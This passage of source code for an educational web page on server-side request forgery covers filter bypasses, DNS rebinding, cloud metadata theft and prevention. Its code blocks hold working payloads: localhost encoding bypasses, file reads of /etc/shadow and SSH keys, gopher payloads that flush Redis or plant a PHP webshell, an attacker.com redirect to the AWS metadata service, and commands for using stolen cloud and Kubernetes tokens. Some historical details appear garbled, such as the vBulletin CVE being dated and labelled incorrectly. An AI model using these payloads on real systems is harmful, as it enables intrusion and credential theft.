            <AlertTitle sx={{ color: "#e0e0e0" }}>Authorization Required</AlertTitle>
            <Typography sx={{ color: "grey.300" }}>
              Only test SSRF on systems you have explicit permission to test.
            </Typography>
          </Alert>

          <Paper sx={{ p: 3, mb: 3, bgcolor: alpha("#dc2626", 0.03), borderRadius: 2, border: `1px solid ${alpha("#dc2626", 0.2)}` }}>
            <Typography variant="h6" sx={{ fontWeight: 700, mb: 2, color: "#dc2626" }}>
              Breaking Through SSRF Protections: The Cat and Mouse Game
            </Typography>
            <Typography paragraph sx={{ fontSize: "0.95rem", lineHeight: 1.8, color: "grey.300" }}>
              Most modern applications implement some form of SSRF protection, but these filters are notoriously difficult to build correctly. The fundamental
              problem is that URLs are complex: they support multiple encoding schemes, have ambiguous parsing rules across libraries, and can be represented
              in countless equivalent forms. A naive blacklist might block "127.0.0.1" and "localhost", but what about <strong>0.0.0.0</strong> (which many
              systems treat as localhost)? What about <strong>[::1]</strong> (IPv6 localhost)? What about <strong>2130706433</strong> (decimal representation
              of 127.0.0.1)? What about <strong>0x7f000001</strong> (hexadecimal)? These are all valid ways to reference localhost, and URL parsers handle
              them differently across languages and libraries.
            </Typography>
            <Typography paragraph sx={{ fontSize: "0.95rem", lineHeight: 1.8, color: "grey.300" }}>
              Even when filters attempt to be comprehensive, they often fall victim to <strong>parser differentials</strong>—the same URL is interpreted
              differently by the validation code versus the code that makes the actual request. Consider this URL:{" "}
              <code style={{background: alpha("#ef4444", 0.1), padding: "2px 6px", borderRadius: "4px"}}>http://evil.com@localhost/</code>. Is "localhost"
              the hostname or the username? Different parsers disagree. Python's urlparse sees "localhost" as the host, but curl sees it as a username with
              "evil.com" as the host. An attacker can exploit this: submit a URL that passes validation but is interpreted maliciously when executed. This
              exact technique was used in the <strong>2018 vBulletin SSRF</strong> (CVE-2019-16759) to bypass host whitelisting and access internal services.
            </Typography>
            <Typography sx={{ fontSize: "0.95rem", lineHeight: 1.8, color: "grey.300" }}>
              URL encoding provides another bypass vector. A filter might block "http://localhost/" but miss{" "}
              <code style={{background: alpha("#ef4444", 0.1), padding: "2px 6px", borderRadius: "4px"}}>http://localh%6fst/</code> (encoding the 'o' in
              localhost). Double URL encoding can bypass filters that decode once:{" "}
              <code style={{background: alpha("#ef4444", 0.1), padding: "2px 6px", borderRadius: "4px"}}>http://localh%256fst/</code> (where %25 = '%').
              Unicode encoding offers even more creative bypasses:{" "}
              <code style={{background: alpha("#ef4444", 0.1), padding: "2px 6px", borderRadius: "4px"}}>http://ⓛⓞⓒⓐⓛⓗⓞⓢⓣ/</code> uses Unicode circled
              letters that some parsers normalize to ASCII. The sheer number of encoding variations makes comprehensive blacklisting nearly impossible.
            </Typography>
          </Paper>

          <Paper sx={{ p: 3, mb: 3, bgcolor: alpha("#f59e0b", 0.03), borderRadius: 2, border: `1px solid ${alpha("#f59e0b", 0.2)}` }}>
            <Typography variant="h6" sx={{ fontWeight: 700, mb: 2, color: "#f59e0b" }}>
              DNS Rebinding: When Time is the Weapon
            </Typography>
            <Typography paragraph sx={{ fontSize: "0.95rem", lineHeight: 1.8, color: "grey.300" }}>
              DNS rebinding is an advanced SSRF technique that exploits the time-of-check-time-of-use (TOCTOU) race condition in URL validation. Here's how
              it works: The application validates your URL by resolving the hostname to an IP address and checking if it's an internal IP. If it resolves to
              a safe external IP, validation passes. But then, <strong>before the actual HTTP request is made</strong>, you change the DNS record to point
              to an internal IP like 127.0.0.1 or 169.254.169.254. The application makes the request using the cached hostname, but DNS resolves it to the
              malicious internal IP, bypassing all protections.
            </Typography>
            <Typography paragraph sx={{ fontSize: "0.95rem", lineHeight: 1.8, color: "grey.300" }}>
              This attack requires controlling a domain with a very low TTL (Time To Live), often 0 seconds. Services like <strong>rbndr.us</strong> and{" "}
              <strong>1u.ms</strong> provide DNS rebinding services specifically for security testing. You create a domain like{" "}
              <code style={{background: alpha("#ef4444", 0.1), padding: "2px 6px", borderRadius: "4px"}}>A.B.C.D.1u.ms</code> where A.B.C.D is the internal
              IP you want to target. The first DNS query returns a safe IP, but subsequent queries return the encoded internal IP. This bypasses even
              sophisticated SSRF filters that check IPs at validation time.
            </Typography>
            <Typography sx={{ fontSize: "0.95rem", lineHeight: 1.8, color: "grey.300" }}>
              DNS rebinding was famously used in the <strong>2020 Travis CI SSRF vulnerability</strong>, which allowed attackers to access internal
              infrastructure and pivot to cloud metadata services. The attack is particularly effective against cloud environments where metadata services
              at 169.254.169.254 contain IAM credentials. Defenses include: <strong>pinning DNS results</strong> at validation time and reusing them for
              the request, setting minimum TTL values to prevent instant rebinding, and implementing allowlists rather than blocklists for allowed destinations.
            </Typography>
          </Paper>

          <Typography variant="h6" sx={{ fontWeight: 700, color: "#e0e0e0", mb: 2 }}>Filter Bypass Techniques</Typography>
          <TableContainer component={Paper} sx={{ mb: 3, bgcolor: alpha("#dc2626", 0.05), border: `1px solid ${alpha("#dc2626", 0.2)}` }}>
            <Table>
              <TableHead>
                <TableRow sx={{ bgcolor: "action.hover" }}>
                  <TableCell><strong>Technique</strong></TableCell>
                  <TableCell><strong>Example</strong></TableCell>
                  <TableCell><strong>Description</strong></TableCell>
                </TableRow>
              </TableHead>
              <TableBody>
                {bypassTechniques.map((row) => (
                  <TableRow key={row.technique}>
                    <TableCell><Typography fontWeight="bold">{row.technique}</Typography></TableCell>
                    <TableCell><code>{row.example}</code></TableCell>
                    <TableCell><Typography variant="body2" color="text.secondary">{row.desc}</Typography></TableCell>
                  </TableRow>
                ))}
              </TableBody>
            </Table>
          </TableContainer>

          <Accordion defaultExpanded>
            <AccordionSummary expandIcon={<ExpandMoreIcon />}>
              <Typography fontWeight="bold">localhost Bypass Payloads</Typography>
            </AccordionSummary>
            <AccordionDetails>
              <CodeBlock title="Comprehensive localhost Bypasses">{`# Decimal IP encoding
http://2130706433/              # 127.0.0.1
http://3232235521/              # 192.168.0.1
http://3232235777/              # 192.168.1.1
http://2886729729/              # 172.16.0.1

# Octal IP encoding
http://0177.0.0.1/
http://0177.0000.0000.0001/
http://017700000001/

# Hex IP encoding
http://0x7f.0x0.0x0.0x1/
http://0x7f000001/
http://0x7f.0.0.1/

# Mixed encoding
http://0177.0x0.0.0/
http://0x7f.0.1/

# IPv6 representations
http://[::1]/
http://[0:0:0:0:0:0:0:1]/
http://[::ffff:127.0.0.1]/
http://[::ffff:7f00:1]/
http://[0000::1]/

# Shortened IPv6
http://[::127.0.0.1]/
http://[::]/ (binds to all interfaces)

# Wildcard DNS services
http://127.0.0.1.nip.io/
http://www.127.0.0.1.nip.io/
http://127.0.0.1.sslip.io/
http://localtest.me/           # Resolves to 127.0.0.1
http://spoofed.burpcollaborator.net/

# Rare but valid
http://127.1/
http://127.0.1/
http://0/
http://0.0.0.0/

# URL parsing quirks
http://localhost#@evil.com/
http://evil.com@localhost/
http://localhost:80#@evil.com/
http://localhost%00.evil.com/
http://localhost%09.evil.com/
http://localhost%2509/
http://127。0。0。1/ (fullwidth dots)`}</CodeBlock>
            </AccordionDetails>
          </Accordion>

          <Accordion>
            <AccordionSummary expandIcon={<ExpandMoreIcon />}>
              <Typography fontWeight="bold">Protocol Exploitation</Typography>
            </AccordionSummary>
            <AccordionDetails>
              <CodeBlock title="Protocol-based attacks">{`# File protocol - Read local files
file:///etc/passwd
file:///etc/shadow
file:///proc/self/environ
file:///proc/self/cmdline
file://localhost/etc/passwd
file://127.0.0.1/etc/passwd

# Windows file paths
file:///C:/Windows/System32/drivers/etc/hosts
file:///C:/Users/Administrator/.ssh/id_rsa

# Gopher protocol - Interact with TCP services
# Redis - Flush all data
gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall%0d%0a

# Redis - Write webshell
gopher://127.0.0.1:6379/_*3%0d%0a$3%0d%0aset%0d%0a$4%0d%0atest%0d%0a$17%0d%0a<?php%20phpinfo();?>%0d%0a

# Memcached interaction
gopher://127.0.0.1:11211/_stats%0d%0a

# SMTP - Send email
gopher://127.0.0.1:25/_HELO%20localhost%0d%0aMAIL%20FROM%3A%3Cattacker%40evil.com%3E%0d%0a

# Dict protocol - Banner grabbing
dict://127.0.0.1:6379/info
dict://127.0.0.1:11211/stats

# LDAP protocol
ldap://127.0.0.1:389/
ldaps://127.0.0.1:636/

# FTP protocol
ftp://127.0.0.1:21/`}</CodeBlock>
            </AccordionDetails>
          </Accordion>

          <Accordion>
            <AccordionSummary expandIcon={<ExpandMoreIcon />}>
              <Typography fontWeight="bold">DNS Rebinding Attack</Typography>
            </AccordionSummary>
            <AccordionDetails>
              <Alert severity="info" sx={{ mb: 2 }}>
                DNS rebinding bypasses IP-based validation by changing DNS resolution between the validation check and the actual request.
              </Alert>
              <CodeBlock title="DNS Rebinding Setup">{`# How DNS Rebinding Works:
# 1. Attacker controls DNS for evil.com
# 2. First query: evil.com → 1.2.3.4 (external IP, passes validation)
# 3. TTL expires quickly (or client re-queries)
# 4. Second query: evil.com → 127.0.0.1 (internal IP)
# 5. Request goes to internal address

# Tools for DNS Rebinding:
# - rbndr.us: Free DNS rebinding service
# - Singularity: https://github.com/nccgroup/singularity
# - Whonow: https://github.com/taviso/whonow

# Example with rbndr.us
# Creates a domain that alternates between two IPs
http://7f000001.c0a80001.rbndr.us/
# First resolve: 127.0.0.1
# Second resolve: 192.168.0.1

# Defense: Validate DNS after EVERY resolution, not just initial`}</CodeBlock>
            </AccordionDetails>
          </Accordion>

          <Accordion>
            <AccordionSummary expandIcon={<ExpandMoreIcon />}>
              <Typography fontWeight="bold">Redirect-Based Bypass</Typography>
            </AccordionSummary>
            <AccordionDetails>
              <CodeBlock title="Using Redirects to Bypass Filters">{`# If the app follows redirects, you can bypass URL validation

# Step 1: Set up redirect on your server
# redirect.php:
<?php header("Location: http://169.254.169.254/latest/meta-data/"); ?>

# Step 2: Submit your external URL
url=http://attacker.com/redirect.php

# The app validates attacker.com (external = OK)
# Then follows redirect to internal IP

# Chained redirects
http://attacker.com/r1 → 302 → http://attacker.com/r2 → 302 → http://127.0.0.1/

# URL shorteners (if not blocked)
http://bit.ly/xxx → http://internal-system/

# Defense: Disable redirects or validate each hop
# Python: requests.get(url, allow_redirects=False)
# curl: curl -L --max-redirs 0`}</CodeBlock>
            </AccordionDetails>
          </Accordion>
        </Paper>
      </Box>

      {/* Section: Cloud Attacks */}
      <Box id="cloud-attacks" sx={{ mb: 4, scrollMarginTop: "80px" }}>
        <Paper
          sx={{
            p: 4,
            borderRadius: 3,
            bgcolor: "#0f1024",
            border: `1px solid ${alpha("#8b5cf6", 0.3)}`,
          }}
        >
          <Typography variant="h5" sx={{ fontWeight: 700, color: "#e0e0e0", mb: 3, display: "flex", alignItems: "center", gap: 2 }}>
            <StorageIcon sx={{ color: "#8b5cf6" }} />
            Cloud Metadata Attacks
          </Typography>

          <Alert severity="error" sx={{ mb: 3, bgcolor: alpha("#ef4444", 0.1), border: `1px solid ${alpha("#ef4444", 0.3)}` }}>
            <AlertTitle sx={{ color: "#e0e0e0" }}>Critical Risk</AlertTitle>
            <Typography sx={{ color: "grey.300" }}>
              Cloud metadata SSRF can lead to complete infrastructure compromise. The 2019 Capital One breach
              exposed 100+ million records through AWS metadata SSRF.
            </Typography>
          </Alert>

          <Paper sx={{ p: 3, mb: 3, bgcolor: alpha("#8b5cf6", 0.03), borderRadius: 2, border: `1px solid ${alpha("#8b5cf6", 0.2)}` }}>
            <Typography variant="h6" sx={{ fontWeight: 700, mb: 2, color: "#8b5cf6" }}>
              The 169.254.169.254 Goldmine: Why Cloud Metadata is the Ultimate SSRF Target
            </Typography>
            <Typography paragraph sx={{ fontSize: "0.95rem", lineHeight: 1.8, color: "grey.300" }}>
              Every major cloud provider (AWS, GCP, Azure, DigitalOcean, Alibaba Cloud) exposes a metadata service at the link-local address{" "}
              <code style={{background: alpha("#f59e0b", 0.1), padding: "2px 6px", borderRadius: "4px"}}>169.254.169.254</code>. This IP address is
              non-routable—it only works from within the cloud instance itself. The metadata service provides critical information about the running
              instance: hostname, IP addresses, security groups, user data, and most critically, <strong>IAM credentials</strong>. These credentials grant
              the instance's role permissions, which often include access to S3 buckets, databases, secrets managers, and other cloud resources.
            </Typography>
            <Typography paragraph sx={{ fontSize: "0.95rem", lineHeight: 1.8, color: "grey.300" }}>
              The Capital One breach of 2019 is the canonical example of cloud metadata SSRF exploitation. A misconfigured web application firewall (WAF)
              allowed an attacker to perform SSRF against the AWS metadata service. By accessing{" "}
              <code style={{background: alpha("#ef4444", 0.1), padding: "2px 6px", borderRadius: "4px"}}>http://169.254.169.254/latest/meta-data/iam/security-credentials/</code>,
              the attacker retrieved temporary IAM credentials with overly permissive S3 access. These credentials were then used to exfiltrate over
              <strong> 100 million customer records</strong>, credit card applications, and Social Security numbers. Capital One was fined $80 million
              by regulators, and the breach resulted in a $190 million class-action settlement. All because of a single SSRF vulnerability combined with
              overprivileged IAM roles.
            </Typography>
            <Typography sx={{ fontSize: "0.95rem", lineHeight: 1.8, color: "grey.300" }}>
              What makes cloud metadata SSRF so devastating is the <strong>automatic escalation</strong> from web application compromise to full infrastructure
              access. No additional credentials are needed—the metadata service provides them automatically. In multi-tenant environments, this can lead to
              lateral movement between customer accounts. Even if the compromised instance has limited direct access, the stolen IAM credentials can often
              be used to enumerate other resources, read secrets from parameter stores, or access internal APIs. Bug bounty programs regularly pay $10,000+
              for metadata SSRF vulnerabilities, recognizing their critical severity.
            </Typography>
          </Paper>

          <Paper sx={{ p: 3, mb: 3, bgcolor: alpha("#ef4444", 0.03), borderRadius: 2, border: `1px solid ${alpha("#ef4444", 0.2)}` }}>
            <Typography variant="h6" sx={{ fontWeight: 700, mb: 2, color: "#ef4444" }}>
              IMDSv2 and the Arms Race of Metadata Protection
            </Typography>
            <Typography paragraph sx={{ fontSize: "0.95rem", lineHeight: 1.8, color: "grey.300" }}>
              After the Capital One breach, AWS introduced <strong>Instance Metadata Service Version 2 (IMDSv2)</strong> as a defense against SSRF attacks.
              IMDSv2 requires a two-step process: first, make a PUT request to obtain a session token, then use that token in subsequent metadata requests
              via a custom HTTP header. This makes SSRF exploitation significantly harder because most vulnerable applications only support GET requests
              and don't allow header injection. The PUT requirement alone blocks the vast majority of SSRF vulnerabilities.
            </Typography>
            <Typography paragraph sx={{ fontSize: "0.95rem", lineHeight: 1.8, color: "grey.300" }}>
              However, IMDSv2 is not a silver bullet. First, it's not enforced by default—many organizations still run with IMDSv1 enabled for backward
              compatibility. Second, some applications <em>do</em> allow arbitrary HTTP methods and headers. If a developer exposed a full HTTP proxy or
              used a library like Python's{" "}
              <code style={{background: alpha("#f59e0b", 0.1), padding: "2px 6px", borderRadius: "4px"}}>requests</code> with full parameter control,
              an attacker could craft the required PUT request with headers to bypass IMDSv2 protection. Third, IMDSv2 doesn't protect against{" "}
              <strong>container escape</strong> scenarios—if an attacker escapes a container, they're already on the host and can access IMDSv2 directly.
            </Typography>
            <Typography sx={{ fontSize: "0.95rem", lineHeight: 1.8, color: "grey.300" }}>
              GCP and Azure implement similar protections. GCP requires a <code style={{background: alpha("#f59e0b", 0.1), padding: "2px 6px", borderRadius: "4px"}}>
              Metadata-Flavor: Google</code> header on all metadata requests. Azure's Instance Metadata Service (IMDS) requires headers and specific API
              versions. Yet vulnerabilities persist. In 2021, researchers found SSRF bypasses in Azure's own services, and in 2022, a GCP vulnerability
              allowed accessing metadata without headers via an older API version. The lesson: cloud metadata services remain high-value targets, and
              defense in depth—network segmentation, least privilege IAM, and disabling metadata access when not needed—is essential.
            </Typography>
          </Paper>

          <Typography variant="h6" sx={{ fontWeight: 700, color: "#e0e0e0", mb: 2 }}>Cloud Provider Metadata Endpoints</Typography>
          <TableContainer component={Paper} sx={{ mb: 3, bgcolor: alpha("#8b5cf6", 0.05), border: `1px solid ${alpha("#8b5cf6", 0.2)}` }}>
            <Table>
              <TableHead>
                <TableRow sx={{ bgcolor: "action.hover" }}>
                  <TableCell><strong>Provider</strong></TableCell>
                  <TableCell><strong>Endpoint</strong></TableCell>
                  <TableCell><strong>Sensitive Data</strong></TableCell>
                </TableRow>
              </TableHead>
              <TableBody>
                {cloudMetadataEndpoints.map((row) => (
                  <TableRow key={row.provider}>
                    <TableCell><Typography fontWeight="bold" color="primary">{row.provider}</Typography></TableCell>
                    <TableCell><code style={{ fontSize: "0.8rem" }}>{row.endpoint}</code></TableCell>
                    <TableCell><Typography variant="body2">{row.sensitive}</Typography></TableCell>
                  </TableRow>
                ))}
              </TableBody>
            </Table>
          </TableContainer>

          <Accordion defaultExpanded>
            <AccordionSummary expandIcon={<ExpandMoreIcon />}>
              <Typography fontWeight="bold">AWS Metadata Exploitation</Typography>
            </AccordionSummary>
            <AccordionDetails>
              <CodeBlock title="AWS Metadata Endpoints">{`# Basic metadata access
http://169.254.169.254/latest/meta-data/

# Instance identity
http://169.254.169.254/latest/meta-data/instance-id
http://169.254.169.254/latest/meta-data/hostname
http://169.254.169.254/latest/meta-data/ami-id

# Network information
http://169.254.169.254/latest/meta-data/local-ipv4
http://169.254.169.254/latest/meta-data/public-ipv4
http://169.254.169.254/latest/meta-data/mac

# IAM Credentials (THE JACKPOT!)
http://169.254.169.254/latest/meta-data/iam/info
http://169.254.169.254/latest/meta-data/iam/security-credentials/
http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE-NAME

# User data (often contains secrets)
http://169.254.169.254/latest/user-data

# Using stolen credentials
export AWS_ACCESS_KEY_ID=ASIA...
export AWS_SECRET_ACCESS_KEY=...
export AWS_SESSION_TOKEN=...
aws sts get-caller-identity`}</CodeBlock>

              <Alert severity="warning" sx={{ mt: 2 }}>
                <AlertTitle>AWS IMDSv2 Protection</AlertTitle>
                IMDSv2 requires a session token obtained via PUT request, making SSRF exploitation harder but not impossible.
              </Alert>

              <CodeBlock title="IMDSv2 (Requires two requests)">{`# Step 1: Get token (requires PUT with header)
TOKEN=$(curl -X PUT "http://169.254.169.254/latest/api/token" \\
  -H "X-aws-ec2-metadata-token-ttl-seconds: 21600")

# Step 2: Use token to access metadata
curl -H "X-aws-ec2-metadata-token: $TOKEN" \\
  http://169.254.169.254/latest/meta-data/

# SSRF exploitation of IMDSv2 requires:
# 1. Ability to set HTTP method to PUT
# 2. Ability to set custom headers
# Much harder but some apps allow this!`}</CodeBlock>
            </AccordionDetails>
          </Accordion>

          <Accordion>
            <AccordionSummary expandIcon={<ExpandMoreIcon />}>
              <Typography fontWeight="bold">GCP Metadata Exploitation</Typography>
            </AccordionSummary>
            <AccordionDetails>
              <CodeBlock title="GCP Metadata Endpoints">{`# GCP requires Metadata-Flavor header
# But SSRF can sometimes inject headers!

# Basic metadata
http://metadata.google.internal/computeMetadata/v1/
http://169.254.169.254/computeMetadata/v1/

# Instance information
http://metadata.google.internal/computeMetadata/v1/instance/hostname
http://metadata.google.internal/computeMetadata/v1/instance/id

# Service account token (OAuth2!)
http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token

# Service account info
http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/email
http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/scopes

# Project metadata
http://metadata.google.internal/computeMetadata/v1/project/project-id
http://metadata.google.internal/computeMetadata/v1/project/attributes/

# SSH keys (if stored in metadata)
http://metadata.google.internal/computeMetadata/v1/project/attributes/ssh-keys

# Older endpoints (sometimes work without header)
http://metadata.google.internal/computeMetadata/v1beta1/`}</CodeBlock>
            </AccordionDetails>
          </Accordion>

          <Accordion>
            <AccordionSummary expandIcon={<ExpandMoreIcon />}>
              <Typography fontWeight="bold">Azure Metadata Exploitation</Typography>
            </AccordionSummary>
            <AccordionDetails>
              <CodeBlock title="Azure Metadata Endpoints">{`# Azure Instance Metadata Service (IMDS)
http://169.254.169.254/metadata/instance?api-version=2021-02-01

# Identity token
http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/

# Instance details
http://169.254.169.254/metadata/instance/compute?api-version=2021-02-01

# Network info
http://169.254.169.254/metadata/instance/network?api-version=2021-02-01

# Custom data / user data
http://169.254.169.254/metadata/instance/compute/customData?api-version=2021-02-01

# Scheduled events
http://169.254.169.254/metadata/scheduledevents?api-version=2020-07-01

# Using stolen token
curl -H "Authorization: Bearer $TOKEN" \\
  https://management.azure.com/subscriptions?api-version=2020-01-01`}</CodeBlock>
            </AccordionDetails>
          </Accordion>

          <Accordion>
            <AccordionSummary expandIcon={<ExpandMoreIcon />}>
              <Typography fontWeight="bold">Kubernetes Metadata</Typography>
            </AccordionSummary>
            <AccordionDetails>
              <CodeBlock title="Kubernetes Internal Access">{`# Kubernetes API Server
https://kubernetes.default.svc/
https://kubernetes.default.svc.cluster.local/

# Service Account Token (mounted at)
/var/run/secrets/kubernetes.io/serviceaccount/token

# API access with service account token
curl -k -H "Authorization: Bearer $(cat /var/run/secrets/kubernetes.io/serviceaccount/token)" \\
  https://kubernetes.default.svc/api/v1/namespaces/default/secrets

# If SSRF allows file:// - read the token
file:///var/run/secrets/kubernetes.io/serviceaccount/token

# kubelet API (if accessible)
https://NODE-IP:10250/pods
https://NODE-IP:10255/pods

# etcd (if exposed)
http://etcd:2379/v2/keys/`}</CodeBlock>
            </AccordionDetails>
          </Accordion>
        </Paper>
      </Box>

      {/* Section: Prevention */}
      <Box id="prevention" sx={{ mb: 4, scrollMarginTop: "80px" }}>
        <Paper
          sx={{
            p: 4,
            borderRadius: 3,
            bgcolor: "#0f1024",
            border: `1px solid ${alpha("#22c55e", 0.3)}`,
          }}
        >
          <Typography variant="h5" sx={{ fontWeight: 700, color: "#e0e0e0", mb: 3, display: "flex", alignItems: "center", gap: 2 }}>
            <ShieldIcon sx={{ color: "#22c55e" }} />
            Preventing SSRF
          </Typography>

          <Alert severity="success" sx={{ mb: 3, bgcolor: alpha("#22c55e", 0.1), border: `1px solid ${alpha("#22c55e", 0.3)}` }}>
            <Typography sx={{ color: "grey.300" }}>
              Defense in depth is key - combine multiple layers of protection.
            </Typography>
          </Alert>

          <Paper sx={{ p: 3, mb: 3, bgcolor: alpha("#22c55e", 0.03), borderRadius: 2, border: `1px solid ${alpha("#22c55e", 0.2)}` }}>
            <Typography variant="h6" sx={{ fontWeight: 700, mb: 2, color: "#22c55e" }}>
              Why SSRF Prevention is So Difficult: The Allowlist Paradox
            </Typography>
            <Typography paragraph sx={{ fontSize: "0.95rem", lineHeight: 1.8, color: "grey.300" }}>
              Security advice for SSRF prevention universally recommends <strong>allowlisting</strong>—only permit requests to a specific list of known-safe
              domains. This sounds simple in theory but breaks down in practice for many legitimate use cases. Consider a webhook feature where customers
              need to specify their own callback URLs, or a PDF generator that fetches user-provided images, or a social media platform that unfurls links
              from any domain. You <em>can't</em> maintain an allowlist because you don't know ahead of time which domains users will need to access. The
              entire point of these features is flexibility.
            </Typography>
            <Typography paragraph sx={{ fontSize: "0.95rem", lineHeight: 1.8, color: "grey.300" }}>
              This is why SSRF protection requires <strong>defense in depth</strong> rather than a single silver bullet. If you can't use an allowlist, you
              must combine multiple other controls: <strong>(1)</strong> Validate the resolved IP address, not just the hostname—after DNS resolution, check
              if the IP is in private ranges (10.0.0.0/8, 172.16.0.0/12, 192.168.0.0/16, 127.0.0.0/8) or cloud metadata ranges (169.254.0.0/16).{" "}
              <strong>(2)</strong> Disable unnecessary protocols—only allow HTTP/HTTPS, never file://, gopher://, dict://, or others. <strong>(3)</strong>{" "}
              Disable or validate redirects—attackers use open redirects to bypass hostname validation. <strong>(4)</strong> Use network segmentation—even
              if SSRF occurs, the compromised server shouldn't be able to reach critical internal services. <strong>(5)</strong> Apply least privilege—limit
              the IAM role permissions of the instance so stolen credentials have minimal impact.
            </Typography>
            <Typography sx={{ fontSize: "0.95rem", lineHeight: 1.8, color: "grey.300" }}>
              The key insight is that <strong>perfect prevention at the application layer is often impossible</strong>, so you must design your infrastructure
              to contain the damage when SSRF occurs. This is the "assume breach" mentality: cloud metadata services should require authentication (IMDSv2),
              internal services should require valid credentials, and network policies should prevent lateral movement. Shopify's approach is exemplary: they
              run a dedicated "fetch service" that handles all outbound requests, applies consistent validation, monitors for abuse, and runs in a heavily
              restricted network segment that can't reach production databases or metadata services.
            </Typography>
          </Paper>

          <Paper sx={{ p: 3, mb: 3, bgcolor: alpha("#06b6d4", 0.03), borderRadius: 2, border: `1px solid ${alpha("#06b6d4", 0.2)}` }}>
            <Typography variant="h6" sx={{ fontWeight: 700, mb: 2, color: "#06b6d4" }}>
              Real-World Defense Strategies: Learning from Breaches
            </Typography>
            <Typography paragraph sx={{ fontSize: "0.95rem", lineHeight: 1.8, color: "grey.300" }}>
              After the Capital One breach, AWS introduced several defenses that every cloud user should implement. <strong>IMDSv2 (Instance Metadata Service
              Version 2)</strong> requires a session token obtained via PUT request, making exploitation significantly harder. But it's not enabled by default—you
              must explicitly configure it. AWS also added <strong>hop limits</strong> for metadata requests, preventing containers or Fargate tasks from
              accessing the metadata service unless explicitly allowed. These settings should be enforced organization-wide via Service Control Policies (SCPs)
              or CloudFormation templates.
            </Typography>
            <Typography paragraph sx={{ fontSize: "0.95rem", lineHeight: 1.8, color: "grey.300" }}>
              Network-level defenses are equally critical. Use <strong>iptables rules</strong> or security groups to block outbound access to 169.254.169.254
              from application processes. In Kubernetes, use <strong>Network Policies</strong> to prevent pods from reaching the metadata endpoint. For
              egress traffic, use a <strong>proxy server</strong> (like Squid) that logs all outbound requests and applies centralized filtering. This provides
              visibility into SSRF attempts and can block suspicious destinations. Many enterprises use cloud <strong>NAT gateways</strong> with strict
              egress rules—if a server doesn't need to make outbound requests at all, block all egress entirely.
            </Typography>
            <Typography sx={{ fontSize: "0.95rem", lineHeight: 1.8, color: "grey.300" }}>
              Finally, <strong>monitoring and incident response</strong> are essential. Log all outbound HTTP requests with full URLs and response codes.
              Alert on requests to private IP ranges or metadata endpoints. Monitor IAM credential usage—if an EC2 instance's credentials are suddenly
              used from an unexpected region or to access unusual services, it may indicate credential theft via SSRF. Shopify's security team runs honeypot
              metadata services internally—fake endpoints at 169.254.169.254 that log access and trigger security alerts. This "canary" approach helps
              detect SSRF vulnerabilities before they're exploited in production.
            </Typography>
          </Paper>

          <Typography variant="h6" sx={{ fontWeight: 700, color: "#e0e0e0", mb: 2 }}>Prevention Methods</Typography>
          <Grid container spacing={2} sx={{ mb: 3 }}>
            {preventionMethods.map((item) => (
              <Grid item xs={12} sm={6} md={3} key={item.method}>
                <Card
                  sx={{
                    height: "100%",
                    bgcolor: alpha(item.priority === "Critical" ? "#ef4444" : item.priority === "High" ? "#f59e0b" : "#3b82f6", 0.1),
                    border: `1px solid ${alpha(item.priority === "Critical" ? "#ef4444" : item.priority === "High" ? "#f59e0b" : "#3b82f6", 0.3)}`,
                    borderRadius: 2,
                  }}
                >
                  <CardContent>
                    <Box sx={{ display: "flex", justifyContent: "space-between", alignItems: "center", mb: 1 }}>
                      <Typography variant="subtitle1" fontWeight="bold" sx={{ color: "#e0e0e0" }}>
                        {item.method}
                      </Typography>
                      <Chip 
                        label={item.priority} 
                        size="small" 
                        sx={{
                          bgcolor: item.priority === "Critical" ? "#ef4444" : item.priority === "High" ? "#f59e0b" : "#3b82f6",
                          color: "white",
                        }}
                      />
                    </Box>
                    <Typography variant="body2" sx={{ color: "grey.400" }}>{item.desc}</Typography>
                  </CardContent>
                </Card>
              </Grid>
            ))}
          </Grid>

          <Accordion defaultExpanded>
            <AccordionSummary expandIcon={<ExpandMoreIcon />}>
              <Typography fontWeight="bold">URL Validation Best Practices</Typography>
            </AccordionSummary>
            <AccordionDetails>
              <Grid container spacing={2}>
                <Grid item xs={12} md={6}>
                  <Typography variant="subtitle2" fontWeight="bold" color="success.main" gutterBottom>
                    <CheckCircleIcon sx={{ verticalAlign: "middle", mr: 1 }} />
                    DO:
                  </Typography>
                  <List dense>
                    <ListItem><ListItemText primary="Use strict allowlists" secondary="Only allow specific, known-safe domains" /></ListItem>
                    <ListItem><ListItemText primary="Validate after DNS resolution" secondary="Check the resolved IP, not just hostname" /></ListItem>
                    <ListItem><ListItemText primary="Disable redirects or validate each hop" secondary="Prevent redirect-based bypasses" /></ListItem>
                    <ListItem><ListItemText primary="Use URL parsing libraries" secondary="Don't rely on regex for URL validation" /></ListItem>
                    <ListItem><ListItemText primary="Implement request timeouts" secondary="Prevent resource exhaustion attacks" /></ListItem>
                    <ListItem><ListItemText primary="Log and monitor outbound requests" secondary="Detect attempted SSRF attacks" /></ListItem>
                  </List>
                </Grid>
                <Grid item xs={12} md={6}>
                  <Typography variant="subtitle2" fontWeight="bold" color="error.main" gutterBottom>
                    <CancelIcon sx={{ verticalAlign: "middle", mr: 1 }} />
                    DON'T:
                  </Typography>
                  <List dense>
                    <ListItem><ListItemText primary="Use blocklists alone" secondary="Too easy to bypass with encoding tricks" /></ListItem>
                    <ListItem><ListItemText primary="Trust URL validation before DNS" secondary="DNS can resolve to internal IPs" /></ListItem>
                    <ListItem><ListItemText primary="Allow arbitrary protocols" secondary="file://, gopher://, dict:// are dangerous" /></ListItem>
                    <ListItem><ListItemText primary="Return raw responses to users" secondary="Expose internal data even with blind SSRF" /></ListItem>
                    <ListItem><ListItemText primary="Trust user-supplied hostnames" secondary="Can be manipulated in many ways" /></ListItem>
                    <ListItem><ListItemText primary="Ignore SSRF in internal tools" secondary="Internal attackers exist too" /></ListItem>
                  </List>
                </Grid>
              </Grid>
            </AccordionDetails>
          </Accordion>

          <Accordion>
            <AccordionSummary expandIcon={<ExpandMoreIcon />}>
              <Typography fontWeight="bold">Network-Level Defenses</Typography>
            </AccordionSummary>
            <AccordionDetails>
              <List>
                <ListItem>
                  <ListItemIcon><ShieldIcon color="success" /></ListItemIcon>
                  <ListItemText 
                    primary="Network Segmentation" 
                    secondary="Web servers shouldn't be able to reach sensitive internal services directly. Use network policies to restrict access."
